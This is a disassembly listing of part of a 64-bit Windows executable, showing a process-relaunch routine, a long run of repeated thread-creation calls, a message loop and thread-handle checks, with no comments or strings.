   140003c1a:	ff 15 f8 44 00 00    	call   *0x44f8(%rip)        # 0x140008118
   140003c20:	85 c0                	test   %eax,%eax
   140003c22:	0f 84 f1 00 00 00    	je     0x140003d19
   140003c28:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   140003c2f:	48 8d 8d c0 03 00 00 	lea    0x3c0(%rbp),%rcx
   140003c36:	ff 15 04 44 00 00    	call   *0x4404(%rip)        # 0x140008040
   140003c3c:	48 8d 8d c0 03 00 00 	lea    0x3c0(%rbp),%rcx
   140003c43:	ff 15 5f 46 00 00    	call   *0x465f(%rip)        # 0x1400082a8
   140003c49:	48 8d 95 d0 05 00 00 	lea    0x5d0(%rbp),%rdx
   140003c50:	48 8d 8d c0 03 00 00 	lea    0x3c0(%rbp),%rcx
   140003c57:	ff 15 3b 49 00 00    	call   *0x493b(%rip)        # 0x140008598
   140003c5d:	85 c0                	test   %eax,%eax
   140003c5f:	0f 84 b4 00 00 00    	je     0x140003d19
   140003c65:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   140003c6c:	ff 15 3e 46 00 00    	call   *0x463e(%rip)        # 0x1400082b0
   140003c72:	4c 8b c0             	mov    %rax,%r8
   140003c75:	48 8d 95 d0 05 00 00 	lea    0x5d0(%rbp),%rdx
   140003c7c:	48 8d 8d e0 07 00 00 	lea    0x7e0(%rbp),%rcx
   140003c83:	ff 15 17 46 00 00    	call   *0x4617(%rip)        # 0x1400082a0
   140003c89:	45 33 c0             	xor    %r8d,%r8d
   140003c8c:	48 8d 95 e0 07 00 00 	lea    0x7e0(%rbp),%rdx
   140003c93:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   140003c9a:	ff 15 98 43 00 00    	call   *0x4398(%rip)        # 0x140008038
   140003ca0:	85 c0                	test   %eax,%eax
   140003ca2:	75 0b                	jne    0x140003caf
   140003ca4:	ff 15 56 44 00 00    	call   *0x4456(%rip)        # 0x140008100
   140003caa:	83 f8 20             	cmp    $0x20,%eax
   140003cad:	75 6a                	jne    0x140003d19
   140003caf:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003cb2:	c7 44 24 70 70 00 00 	movl   $0x70,0x70(%rsp)
   140003cb9:	00 
   140003cba:	33 c0                	xor    %eax,%eax
   140003cbc:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003cc1:	48 89 45 d4          	mov    %rax,-0x2c(%rbp)
   140003cc5:	89 45 dc             	mov    %eax,-0x24(%rbp)
   140003cc8:	48 8d 05 31 4b 00 00 	lea    0x4b31(%rip),%rax        # 0x140008800
   140003ccf:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   140003cd4:	c7 44 24 74 40 00 00 	movl   $0x40,0x74(%rsp)
   140003cdb:	00 
   140003cdc:	0f 11 45 84          	movups %xmm0,-0x7c(%rbp)
   140003ce0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140003ce4:	48 8d 85 e0 07 00 00 	lea    0x7e0(%rbp),%rax
   140003ceb:	0f 11 45 94          	movups %xmm0,-0x6c(%rbp)
   140003cef:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140003cf3:	0f 11 45 a4          	movups %xmm0,-0x5c(%rbp)
   140003cf7:	c7 45 a0 01 00 00 00 	movl   $0x1,-0x60(%rbp)
   140003cfe:	0f 11 45 b4          	movups %xmm0,-0x4c(%rbp)
   140003d02:	0f 11 45 c4          	movups %xmm0,-0x3c(%rbp)
   140003d06:	ff 15 7c 45 00 00    	call   *0x457c(%rip)        # 0x140008288
   140003d0c:	85 c0                	test   %eax,%eax
   140003d0e:	74 09                	je     0x140003d19
   140003d10:	33 c9                	xor    %ecx,%ecx
   140003d12:	ff 15 40 43 00 00    	call   *0x4340(%rip)        # 0x140008058
   140003d18:	cc                   	int3
   140003d19:	e8 b2 e6 ff ff       	call   0x1400023d0
   140003d1e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003d23:	e8 40 2b 00 00       	call   0x140006868
   140003d28:	48 8d 0d e1 d6 ff ff 	lea    -0x291f(%rip),%rcx        # 0x140001410
   140003d2f:	4c 8b c8             	mov    %rax,%r9
   140003d32:	4c 8d 05 17 24 00 00 	lea    0x2417(%rip),%r8        # 0x140006150
   140003d39:	33 d2                	xor    %edx,%edx
   140003d3b:	48 89 08             	mov    %rcx,(%rax)
   140003d3e:	48 8d 8d 68 01 00 00 	lea    0x168(%rbp),%rcx
   140003d45:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003d4a:	33 c9                	xor    %ecx,%ecx
   140003d4c:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003d50:	ff 15 a2 47 00 00    	call   *0x47a2(%rip)        # 0x1400084f8
   140003d56:	48 89 85 60 01 00 00 	mov    %rax,0x160(%rbp)
   140003d5d:	48 85 c0             	test   %rax,%rax
   140003d60:	0f 84 12 0d 00 00    	je     0x140004a78
   140003d66:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003d6b:	e8 f8 2a 00 00       	call   0x140006868
   140003d70:	48 8d 0d 99 d7 ff ff 	lea    -0x2867(%rip),%rcx        # 0x140001510
   140003d77:	4c 8b c8             	mov    %rax,%r9
   140003d7a:	4c 8d 05 cf 23 00 00 	lea    0x23cf(%rip),%r8        # 0x140006150
   140003d81:	33 d2                	xor    %edx,%edx
   140003d83:	48 89 08             	mov    %rcx,(%rax)
   140003d86:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   140003d8d:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003d92:	33 c9                	xor    %ecx,%ecx
   140003d94:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003d98:	ff 15 5a 47 00 00    	call   *0x475a(%rip)        # 0x1400084f8
   140003d9e:	48 89 85 50 01 00 00 	mov    %rax,0x150(%rbp)
   140003da5:	48 85 c0             	test   %rax,%rax
   140003da8:	0f 84 b8 0c 00 00    	je     0x140004a66
   140003dae:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003db3:	e8 b0 2a 00 00       	call   0x140006868
   140003db8:	48 8d 0d 11 d8 ff ff 	lea    -0x27ef(%rip),%rcx        # 0x1400015d0
   140003dbf:	4c 8b c8             	mov    %rax,%r9
   140003dc2:	4c 8d 05 87 23 00 00 	lea    0x2387(%rip),%r8        # 0x140006150
   140003dc9:	33 d2                	xor    %edx,%edx
   140003dcb:	48 89 08             	mov    %rcx,(%rax)
   140003dce:	48 8d 8d 48 01 00 00 	lea    0x148(%rbp),%rcx
   140003dd5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003dda:	33 c9                	xor    %ecx,%ecx
   140003ddc:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003de0:	ff 15 12 47 00 00    	call   *0x4712(%rip)        # 0x1400084f8
   140003de6:	48 89 85 40 01 00 00 	mov    %rax,0x140(%rbp)
   140003ded:	48 85 c0             	test   %rax,%rax
   140003df0:	0f 84 5e 0c 00 00    	je     0x140004a54
   140003df6:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003dfb:	e8 68 2a 00 00       	call   0x140006868
   140003e00:	48 8d 0d 79 d8 ff ff 	lea    -0x2787(%rip),%rcx        # 0x140001680
   140003e07:	4c 8b c8             	mov    %rax,%r9
   140003e0a:	4c 8d 05 3f 23 00 00 	lea    0x233f(%rip),%r8        # 0x140006150
   140003e11:	33 d2                	xor    %edx,%edx
   140003e13:	48 89 08             	mov    %rcx,(%rax)
   140003e16:	48 8d 8d 38 01 00 00 	lea    0x138(%rbp),%rcx
   140003e1d:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003e22:	33 c9                	xor    %ecx,%ecx
   140003e24:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003e28:	ff 15 ca 46 00 00    	call   *0x46ca(%rip)        # 0x1400084f8
   140003e2e:	48 89 85 30 01 00 00 	mov    %rax,0x130(%rbp)
   140003e35:	48 85 c0             	test   %rax,%rax
   140003e38:	0f 84 04 0c 00 00    	je     0x140004a42
   140003e3e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003e43:	e8 20 2a 00 00       	call   0x140006868
   140003e48:	48 8d 0d c1 d8 ff ff 	lea    -0x273f(%rip),%rcx        # 0x140001710
   140003e4f:	4c 8b c8             	mov    %rax,%r9
   140003e52:	4c 8d 05 f7 22 00 00 	lea    0x22f7(%rip),%r8        # 0x140006150
   140003e59:	33 d2                	xor    %edx,%edx
   140003e5b:	48 89 08             	mov    %rcx,(%rax)
   140003e5e:	48 8d 8d 28 01 00 00 	lea    0x128(%rbp),%rcx
   140003e65:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003e6a:	33 c9                	xor    %ecx,%ecx
   140003e6c:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003e70:	ff 15 82 46 00 00    	call   *0x4682(%rip)        # 0x1400084f8
   140003e76:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   140003e7d:	48 85 c0             	test   %rax,%rax
   140003e80:	0f 84 aa 0b 00 00    	je     0x140004a30
   140003e86:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003e8b:	e8 d8 29 00 00       	call   0x140006868
   140003e90:	48 8d 0d 79 d9 ff ff 	lea    -0x2687(%rip),%rcx        # 0x140001810
   140003e97:	4c 8b c8             	mov    %rax,%r9
   140003e9a:	4c 8d 05 af 22 00 00 	lea    0x22af(%rip),%r8        # 0x140006150
   140003ea1:	33 d2                	xor    %edx,%edx
   140003ea3:	48 89 08             	mov    %rcx,(%rax)
   140003ea6:	48 8d 8d 18 01 00 00 	lea    0x118(%rbp),%rcx
   140003ead:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003eb2:	33 c9                	xor    %ecx,%ecx
   140003eb4:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003eb8:	ff 15 3a 46 00 00    	call   *0x463a(%rip)        # 0x1400084f8
   140003ebe:	48 89 85 10 01 00 00 	mov    %rax,0x110(%rbp)
   140003ec5:	48 85 c0             	test   %rax,%rax
   140003ec8:	0f 84 50 0b 00 00    	je     0x140004a1e
   140003ece:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003ed3:	e8 90 29 00 00       	call   0x140006868
   140003ed8:	48 8d 0d 01 da ff ff 	lea    -0x25ff(%rip),%rcx        # 0x1400018e0
   140003edf:	4c 8b c8             	mov    %rax,%r9
   140003ee2:	4c 8d 05 67 22 00 00 	lea    0x2267(%rip),%r8        # 0x140006150
   140003ee9:	33 d2                	xor    %edx,%edx
   140003eeb:	48 89 08             	mov    %rcx,(%rax)
   140003eee:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   140003ef5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003efa:	33 c9                	xor    %ecx,%ecx
   140003efc:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003f00:	ff 15 f2 45 00 00    	call   *0x45f2(%rip)        # 0x1400084f8
   140003f06:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   140003f0d:	48 85 c0             	test   %rax,%rax
   140003f10:	0f 84 f6 0a 00 00    	je     0x140004a0c
   140003f16:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003f1b:	e8 48 29 00 00       	call   0x140006868
   140003f20:	48 8d 0d 89 da ff ff 	lea    -0x2577(%rip),%rcx        # 0x1400019b0
   140003f27:	4c 8b c8             	mov    %rax,%r9
   140003f2a:	4c 8d 05 1f 22 00 00 	lea    0x221f(%rip),%r8        # 0x140006150
   140003f31:	33 d2                	xor    %edx,%edx
   140003f33:	48 89 08             	mov    %rcx,(%rax)
   140003f36:	48 8d 8d f8 00 00 00 	lea    0xf8(%rbp),%rcx
   140003f3d:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003f42:	33 c9                	xor    %ecx,%ecx
   140003f44:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003f48:	ff 15 aa 45 00 00    	call   *0x45aa(%rip)        # 0x1400084f8
   140003f4e:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   140003f55:	48 85 c0             	test   %rax,%rax
   140003f58:	0f 84 9c 0a 00 00    	je     0x1400049fa
   140003f5e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003f63:	e8 00 29 00 00       	call   0x140006868
   140003f68:	48 8d 0d e1 da ff ff 	lea    -0x251f(%rip),%rcx        # 0x140001a50
   140003f6f:	4c 8b c8             	mov    %rax,%r9
   140003f72:	4c 8d 05 d7 21 00 00 	lea    0x21d7(%rip),%r8        # 0x140006150
   140003f79:	33 d2                	xor    %edx,%edx
   140003f7b:	48 89 08             	mov    %rcx,(%rax)
   140003f7e:	48 8d 8d e8 00 00 00 	lea    0xe8(%rbp),%rcx
   140003f85:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003f8a:	33 c9                	xor    %ecx,%ecx
   140003f8c:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003f90:	ff 15 62 45 00 00    	call   *0x4562(%rip)        # 0x1400084f8
   140003f96:	48 89 85 e0 00 00 00 	mov    %rax,0xe0(%rbp)
   140003f9d:	48 85 c0             	test   %rax,%rax
   140003fa0:	0f 84 42 0a 00 00    	je     0x1400049e8
   140003fa6:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003fab:	e8 b8 28 00 00       	call   0x140006868
   140003fb0:	48 8d 0d 99 dc ff ff 	lea    -0x2367(%rip),%rcx        # 0x140001c50
   140003fb7:	4c 8b c8             	mov    %rax,%r9
   140003fba:	4c 8d 05 8f 21 00 00 	lea    0x218f(%rip),%r8        # 0x140006150
   140003fc1:	33 d2                	xor    %edx,%edx
   140003fc3:	48 89 08             	mov    %rcx,(%rax)
   140003fc6:	48 8d 8d d8 00 00 00 	lea    0xd8(%rbp),%rcx
   140003fcd:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003fd2:	33 c9                	xor    %ecx,%ecx
   140003fd4:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003fd8:	ff 15 1a 45 00 00    	call   *0x451a(%rip)        # 0x1400084f8
   140003fde:	48 89 85 d0 00 00 00 	mov    %rax,0xd0(%rbp)
   140003fe5:	48 85 c0             	test   %rax,%rax
   140003fe8:	0f 84 e8 09 00 00    	je     0x1400049d6
   140003fee:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003ff3:	e8 70 28 00 00       	call   0x140006868
   140003ff8:	48 8d 0d 51 dd ff ff 	lea    -0x22af(%rip),%rcx        # 0x140001d50
   140003fff:	4c 8b c8             	mov    %rax,%r9
   140004002:	4c 8d 05 47 21 00 00 	lea    0x2147(%rip),%r8        # 0x140006150
   140004009:	33 d2                	xor    %edx,%edx
   14000400b:	48 89 08             	mov    %rcx,(%rax)
   14000400e:	48 8d 8d c8 00 00 00 	lea    0xc8(%rbp),%rcx
   140004015:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000401a:	33 c9                	xor    %ecx,%ecx
   14000401c:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004020:	ff 15 d2 44 00 00    	call   *0x44d2(%rip)        # 0x1400084f8
   140004026:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   14000402d:	48 85 c0             	test   %rax,%rax
   140004030:	0f 84 8e 09 00 00    	je     0x1400049c4
   140004036:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000403b:	e8 28 28 00 00       	call   0x140006868
   140004040:	48 8d 0d 39 de ff ff 	lea    -0x21c7(%rip),%rcx        # 0x140001e80
   140004047:	4c 8b c8             	mov    %rax,%r9
   14000404a:	4c 8d 05 ff 20 00 00 	lea    0x20ff(%rip),%r8        # 0x140006150
   140004051:	33 d2                	xor    %edx,%edx
   140004053:	48 89 08             	mov    %rcx,(%rax)
   140004056:	48 8d 8d b8 00 00 00 	lea    0xb8(%rbp),%rcx
   14000405d:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004062:	33 c9                	xor    %ecx,%ecx
   140004064:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004068:	ff 15 8a 44 00 00    	call   *0x448a(%rip)        # 0x1400084f8
   14000406e:	48 89 85 b0 00 00 00 	mov    %rax,0xb0(%rbp)
   140004075:	48 85 c0             	test   %rax,%rax
   140004078:	0f 84 34 09 00 00    	je     0x1400049b2
   14000407e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004083:	e8 e0 27 00 00       	call   0x140006868
   140004088:	48 8d 0d e1 de ff ff 	lea    -0x211f(%rip),%rcx        # 0x140001f70
   14000408f:	4c 8b c8             	mov    %rax,%r9
   140004092:	4c 8d 05 b7 20 00 00 	lea    0x20b7(%rip),%r8        # 0x140006150
   140004099:	33 d2                	xor    %edx,%edx
   14000409b:	48 89 08             	mov    %rcx,(%rax)
   14000409e:	48 8d 8d a8 00 00 00 	lea    0xa8(%rbp),%rcx
   1400040a5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040aa:	33 c9                	xor    %ecx,%ecx
   1400040ac:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400040b0:	ff 15 42 44 00 00    	call   *0x4442(%rip)        # 0x1400084f8
   1400040b6:	48 89 85 a0 00 00 00 	mov    %rax,0xa0(%rbp)
   1400040bd:	48 85 c0             	test   %rax,%rax
   1400040c0:	0f 84 da 08 00 00    	je     0x1400049a0
   1400040c6:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400040cb:	e8 98 27 00 00       	call   0x140006868
   1400040d0:	48 8d 0d e9 df ff ff 	lea    -0x2017(%rip),%rcx        # 0x1400020c0
   1400040d7:	4c 8b c8             	mov    %rax,%r9
   1400040da:	4c 8d 05 6f 20 00 00 	lea    0x206f(%rip),%r8        # 0x140006150
   1400040e1:	33 d2                	xor    %edx,%edx
   1400040e3:	48 89 08             	mov    %rcx,(%rax)
   1400040e6:	48 8d 8d 98 00 00 00 	lea    0x98(%rbp),%rcx
   1400040ed:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040f2:	33 c9                	xor    %ecx,%ecx
   1400040f4:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400040f8:	ff 15 fa 43 00 00    	call   *0x43fa(%rip)        # 0x1400084f8
   1400040fe:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   140004105:	48 85 c0             	test   %rax,%rax
   140004108:	0f 84 80 08 00 00    	je     0x14000498e
   14000410e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004113:	e8 50 27 00 00       	call   0x140006868
   140004118:	48 8d 0d d1 e0 ff ff 	lea    -0x1f2f(%rip),%rcx        # 0x1400021f0
   14000411f:	4c 8b c8             	mov    %rax,%r9
   140004122:	4c 8d 05 27 20 00 00 	lea    0x2027(%rip),%r8        # 0x140006150
   140004129:	33 d2                	xor    %edx,%edx
   14000412b:	48 89 08             	mov    %rcx,(%rax)
   14000412e:	48 8d 8d 88 00 00 00 	lea    0x88(%rbp),%rcx
   140004135:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000413a:	33 c9                	xor    %ecx,%ecx
   14000413c:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004140:	ff 15 b2 43 00 00    	call   *0x43b2(%rip)        # 0x1400084f8
   140004146:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   14000414d:	48 85 c0             	test   %rax,%rax
   140004150:	0f 84 26 08 00 00    	je     0x14000497c
   140004156:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000415b:	e8 08 27 00 00       	call   0x140006868
   140004160:	48 8d 0d 39 f0 ff ff 	lea    -0xfc7(%rip),%rcx        # 0x1400031a0
   140004167:	4c 8b c8             	mov    %rax,%r9
   14000416a:	4c 8d 05 df 1f 00 00 	lea    0x1fdf(%rip),%r8        # 0x140006150
   140004171:	33 d2                	xor    %edx,%edx
   140004173:	48 89 08             	mov    %rcx,(%rax)
   140004176:	48 8d 4d 78          	lea    0x78(%rbp),%rcx
   14000417a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000417f:	33 c9                	xor    %ecx,%ecx
   140004181:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004185:	ff 15 6d 43 00 00    	call   *0x436d(%rip)        # 0x1400084f8
   14000418b:	48 89 45 70          	mov    %rax,0x70(%rbp)
   14000418f:	48 85 c0             	test   %rax,%rax
   140004192:	0f 84 d5 07 00 00    	je     0x14000496d
   140004198:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000419d:	e8 c6 26 00 00       	call   0x140006868
   1400041a2:	48 8d 0d 27 f5 ff ff 	lea    -0xad9(%rip),%rcx        # 0x1400036d0
   1400041a9:	4c 8b c8             	mov    %rax,%r9
   1400041ac:	4c 8d 05 9d 1f 00 00 	lea    0x1f9d(%rip),%r8        # 0x140006150
   1400041b3:	33 d2                	xor    %edx,%edx
   1400041b5:	48 89 08             	mov    %rcx,(%rax)
   1400041b8:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   1400041bc:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400041c1:	33 c9                	xor    %ecx,%ecx
   1400041c3:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400041c7:	ff 15 2b 43 00 00    	call   *0x432b(%rip)        # 0x1400084f8
   1400041cd:	48 89 45 60          	mov    %rax,0x60(%rbp)
   1400041d1:	48 85 c0             	test   %rax,%rax
   1400041d4:	0f 84 84 07 00 00    	je     0x14000495e
   1400041da:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041df:	e8 84 26 00 00       	call   0x140006868
   1400041e4:	48 8d 15 d5 eb ff ff 	lea    -0x142b(%rip),%rdx        # 0x140002dc0
   1400041eb:	4c 8b c8             	mov    %rax,%r9
   1400041ee:	4c 8d 05 5b 1f 00 00 	lea    0x1f5b(%rip),%r8        # 0x140006150
   1400041f5:	33 c9                	xor    %ecx,%ecx
   1400041f7:	48 89 10             	mov    %rdx,(%rax)
   1400041fa:	48 8d 55 58          	lea    0x58(%rbp),%rdx
   1400041fe:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140004203:	33 d2                	xor    %edx,%edx
   140004205:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004209:	ff 15 e9 42 00 00    	call   *0x42e9(%rip)        # 0x1400084f8
   14000420f:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140004213:	48 85 c0             	test   %rax,%rax
   140004216:	0f 84 33 07 00 00    	je     0x14000494f
   14000421c:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004221:	e8 42 26 00 00       	call   0x140006868
   140004226:	48 8d 0d 83 f6 ff ff 	lea    -0x97d(%rip),%rcx        # 0x1400038b0
   14000422d:	4c 8b c8             	mov    %rax,%r9
   140004230:	4c 8d 05 19 1f 00 00 	lea    0x1f19(%rip),%r8        # 0x140006150
   140004237:	33 d2                	xor    %edx,%edx
   140004239:	48 89 08             	mov    %rcx,(%rax)
   14000423c:	48 8d 4d 48          	lea    0x48(%rbp),%rcx
   140004240:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004245:	33 c9                	xor    %ecx,%ecx
   140004247:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000424b:	ff 15 a7 42 00 00    	call   *0x42a7(%rip)        # 0x1400084f8
   140004251:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140004255:	48 85 c0             	test   %rax,%rax
   140004258:	0f 84 e2 06 00 00    	je     0x140004940
   14000425e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004261:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   140004268:	45 33 c9             	xor    %r9d,%r9d
   14000426b:	45 33 c0             	xor    %r8d,%r8d
   14000426e:	33 d2                	xor    %edx,%edx
   140004270:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   140004277:	0f 11 85 80 01 00 00 	movups %xmm0,0x180(%rbp)
   14000427e:	0f 11 85 90 01 00 00 	movups %xmm0,0x190(%rbp)
   140004285:	ff 15 65 40 00 00    	call   *0x4065(%rip)        # 0x1400082f0
   14000428b:	85 c0                	test   %eax,%eax
   14000428d:	74 3d                	je     0x1400042cc
   14000428f:	90                   	nop
   140004290:	40 38 35 1d 8e 00 00 	cmp    %sil,0x8e1d(%rip)        # 0x14000d0b4
   140004297:	74 33                	je     0x1400042cc
   140004299:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   1400042a0:	ff 15 ca 40 00 00    	call   *0x40ca(%rip)        # 0x140008370
   1400042a6:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   1400042ad:	ff 15 8d 40 00 00    	call   *0x408d(%rip)        # 0x140008340
   1400042b3:	45 33 c9             	xor    %r9d,%r9d
   1400042b6:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   1400042bd:	45 33 c0             	xor    %r8d,%r8d
   1400042c0:	33 d2                	xor    %edx,%edx
   1400042c2:	ff 15 28 40 00 00    	call   *0x4028(%rip)        # 0x1400082f0
   1400042c8:	85 c0                	test   %eax,%eax
   1400042ca:	75 c4                	jne    0x140004290
   1400042cc:	39 b5 68 01 00 00    	cmp    %esi,0x168(%rbp)
   1400042d2:	0f 84 5c 06 00 00    	je     0x140004934
   1400042d8:	ff 15 0a 3f 00 00    	call   *0x3f0a(%rip)        # 0x1400081e8
   1400042de:	39 85 68 01 00 00    	cmp    %eax,0x168(%rbp)
   1400042e4:	0f 84 3e 06 00 00    	je     0x140004928
   1400042ea:	0f 28 85 60 01 00 00 	movaps 0x160(%rbp),%xmm0
   1400042f1:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400042f6:	33 d2                	xor    %edx,%edx
   1400042f8:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400042fe:	ff 15 f4 3e 00 00    	call   *0x3ef4(%rip)        # 0x1400081f8
   140004304:	85 c0                	test   %eax,%eax
   140004306:	0f 85 10 06 00 00    	jne    0x14000491c
   14000430c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000430f:	66 0f 7f 85 60 01 00 	movdqa %xmm0,0x160(%rbp)
   140004316:	00 
   140004317:	39 b5 58 01 00 00    	cmp    %esi,0x158(%rbp)
   14000431d:	0f 84 11 06 00 00    	je     0x140004934
   140004323:	ff 15 bf 3e 00 00    	call   *0x3ebf(%rip)        # 0x1400081e8
   140004329:	39 85 58 01 00 00    	cmp    %eax,0x158(%rbp)
   14000432f:	0f 84 f3 05 00 00    	je     0x140004928
   140004335:	0f 28 85 50 01 00 00 	movaps 0x150(%rbp),%xmm0
   14000433c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004341:	33 d2                	xor    %edx,%edx
   140004343:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004349:	ff 15 a9 3e 00 00    	call   *0x3ea9(%rip)        # 0x1400081f8
   14000434f:	85 c0                	test   %eax,%eax
   140004351:	0f 85 c5 05 00 00    	jne    0x14000491c
   140004357:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000435a:	66 0f 7f 85 50 01 00 	movdqa %xmm0,0x150(%rbp)
   140004361:	00 
   140004362:	39 b5 48 01 00 00    	cmp    %esi,0x148(%rbp)
   140004368:	0f 84 c6 05 00 00    	je     0x140004934
   14000436e:	ff 15 74 3e 00 00    	call   *0x3e74(%rip)        # 0x1400081e8
   140004374:	39 85 48 01 00 00    	cmp    %eax,0x148(%rbp)
   14000437a:	0f 84 a8 05 00 00    	je     0x140004928
   140004380:	0f 28 85 40 01 00 00 	movaps 0x140(%rbp),%xmm0
   140004387:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000438c:	33 d2                	xor    %edx,%edx
   14000438e:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004394:	ff 15 5e 3e 00 00    	call   *0x3e5e(%rip)        # 0x1400081f8
   14000439a:	85 c0                	test   %eax,%eax
   14000439c:	0f 85 7a 05 00 00    	jne    0x14000491c
   1400043a2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400043a5:	66 0f 7f 85 40 01 00 	movdqa %xmm0,0x140(%rbp)
   1400043ac:	00 
   1400043ad:	39 b5 38 01 00 00    	cmp    %esi,0x138(%rbp)
   1400043b3:	0f 84 7b 05 00 00    	je     0x140004934
   1400043b9:	ff 15 29 3e 00 00    	call   *0x3e29(%rip)        # 0x1400081e8
   1400043bf:	39 85 38 01 00 00    	cmp    %eax,0x138(%rbp)
   1400043c5:	0f 84 5d 05 00 00    	je     0x140004928
   1400043cb:	0f 28 85 30 01 00 00 	movaps 0x130(%rbp),%xmm0
   1400043d2:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400043d7:	33 d2                	xor    %edx,%edx
   1400043d9:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400043df:	ff 15 13 3e 00 00    	call   *0x3e13(%rip)        # 0x1400081f8
   1400043e5:	85 c0                	test   %eax,%eax
   1400043e7:	0f 85 2f 05 00 00    	jne    0x14000491c
   1400043ed:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400043f0:	66 0f 7f 85 30 01 00 	movdqa %xmm0,0x130(%rbp)
   1400043f7:	00 
   1400043f8:	39 b5 28 01 00 00    	cmp    %esi,0x128(%rbp)
   1400043fe:	0f 84 30 05 00 00    	je     0x140004934
   140004404:	ff 15 de 3d 00 00    	call   *0x3dde(%rip)        # 0x1400081e8
   14000440a:	39 85 28 01 00 00    	cmp    %eax,0x128(%rbp)
   140004410:	0f 84 12 05 00 00    	je     0x140004928
   140004416:	0f 28 85 20 01 00 00 	movaps 0x120(%rbp),%xmm0
